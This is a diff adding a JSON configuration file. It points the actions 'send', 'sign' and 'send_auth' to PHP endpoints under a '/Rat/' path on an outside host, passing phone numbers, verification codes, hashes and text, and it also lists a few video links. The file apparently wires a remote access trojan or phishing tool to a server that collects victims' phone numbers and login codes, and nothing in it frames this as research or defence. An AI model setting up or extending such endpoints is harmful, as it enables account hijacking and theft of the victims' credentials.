@@ -1,0 +1,9 @@
+{
+    "send": "https://mohamadrezazameran.c80.site/Rat/send.php?phone_number=NN1",
+    "sign": "https://mohamadrezazameran.c80.site/Rat/sign.php?code=CC2&hash=HH2&number=NN2",
+    "send_auth": "https://mohamadrezazameran.c80.site/Rat/send_auth.php?text=TT2",
+    "video1": "https://biaupload.com/static/files-2023-06/org-bd0188b11e3f1.mp4",
+    "video2": "https://example.com/video2.mp4",
+    "video3": "https://example.com/video3.mp4",
+    "video4": "https://example.com/video4.mp4"
+}
